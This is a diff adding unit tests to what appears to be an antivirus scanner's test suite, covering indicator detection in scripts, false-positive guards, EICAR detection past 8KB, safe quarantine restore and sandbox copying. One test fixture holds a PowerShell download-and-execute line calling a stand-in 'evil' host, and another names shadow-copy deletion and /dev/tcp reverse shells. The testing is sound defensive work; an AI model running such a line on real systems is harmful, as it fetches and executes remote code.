@@ -144,14 +144,54 @@ def test_ioc_engine_flags_attacks_but_not_benign():
 
 
 def test_script_with_ioc_is_flagged_not_clean():
-    # A plain-looking .txt that actually carries a download-and-execute payload.
+    # A SCRIPT that carries a download-and-execute payload (high-severity IOC).
+    # NB: IOC scanning is intentionally restricted to script types now — scanning prose
+    # (.txt/.md) for indicator strings flagged docs + the scanner's own signature DB.
     body = ('echo hello\n'
             'IEX (New-Object Net.WebClient).DownloadString("http://evil/x.ps1")\n')
-    p = _write("readme.txt", body)
+    p = _write("payload.ps1", body)
     r = antivirus.scan_file(str(p), deep=False)
     assert r["verdict"] in ("suspicious", "malicious"), r
     assert any("indicator" in x for x in r["reasons"]), r
     assert "ioc-signatures" in r["engines"], r
+
+
+def test_prose_with_ioc_words_not_flagged():
+    # A .txt/.md that merely MENTIONS techniques must NOT be flagged (false-positive guard).
+    body = "Notes on mimikatz, vssadmin delete shadows, and reverse shells via /dev/tcp."
+    p = _write("security_notes.md", body)
+    r = antivirus.scan_file(str(p), deep=False)
+    assert r["verdict"] == "clean", r
+
+
+def test_eicar_detected_past_first_8kb():
+    # EICAR hidden after 8KB of padding must still be caught (was only scanned in head).
+    body = (b"A" * 20000) + antivirus.EICAR_SIG
+    p = _write("padded.bin", body)
+    r = antivirus.scan_file(str(p), deep=False)
+    assert r["verdict"] == "malicious", r
+
+
+def test_restore_does_not_overwrite_existing():
+    import os
+    p = _write("victim.exe", antivirus.EICAR_SIG)
+    q = antivirus.quarantine_file(str(p))
+    assert q["ok"], q
+    # Something else now occupies the original path.
+    _write("victim.exe", b"a different, innocent file")
+    r = antivirus.restore_quarantined(q["id"])
+    assert r["ok"], r
+    # The innocent file must be untouched; the restore lands at a non-clobbering name.
+    assert os.path.exists(str(Path(_TMP) / "victim.exe"))
+    assert Path(r["restored_to"]).name != "victim.exe" or r["restored_to"] != str(Path(_TMP) / "victim.exe")
+
+
+def test_compressed_container_not_flagged_on_entropy():
+    # A high-entropy .dmg (every installer) must NOT be 'suspicious' just for entropy.
+    import os
+    p = _write("Installer.dmg", os.urandom(200_000))
+    r = antivirus.scan_file(str(p), deep=False)
+    assert r["verdict"] == "clean", r
 
 
 def test_signature_db_hash_is_malicious():
@@ -205,6 +245,50 @@ def test_status_reports_strong_engines():
     assert "ioc-signatures" in s["engines_available"], s
     assert "fileless-behavioral" in s["engines_available"], s
     assert "fileless_protection" in s
+
+
+def test_native_sandbox_runs_a_copy_not_the_original():
+    """The sandbox must run a throwaway COPY — never chmod (+x) or execute the user's
+    real file in place, and never leak the temp copy."""
+    src = _write("sample.sh", "echo hi\n")
+    os.chmod(src, 0o644)
+    orig_mode = src.stat().st_mode
+
+    captured = {}
+
+    class _R:
+        returncode = 0
+        stdout = "hi"
+        stderr = ""
+
+    def _fake_run(full, **kw):
+        captured["full"] = list(full)
+        return _R()
+
+    real_platform = antivirus.sys.platform
+    real_which = antivirus._which
+    real_run = antivirus.subprocess.run
+    try:
+        antivirus.sys.platform = "linux"
+        antivirus._which = lambda name: "/usr/bin/firejail" if name == "firejail" else None
+        antivirus.subprocess.run = _fake_run
+        out = antivirus._run_native_sandbox(Path(src), [], 5)
+    finally:
+        antivirus.sys.platform = real_platform
+        antivirus._which = real_which
+        antivirus.subprocess.run = real_run
+
+    assert out.get("ok") is True, out
+    joined = " ".join(captured["full"])
+    # The original file path must NOT appear in the executed command…
+    assert str(src) not in joined, captured["full"]
+    # …a staged copy in a throwaway dir must.
+    copy_parts = [x for x in captured["full"] if "ember_sbx_" in x]
+    assert copy_parts, captured["full"]
+    # The user's real file keeps its original permissions (no +x side effect).
+    assert src.stat().st_mode == orig_mode
+    # And the temp copy is cleaned up afterwards.
+    assert not os.path.exists(os.path.dirname(copy_parts[-1]))
 
 
 def _run_all() -> bool:
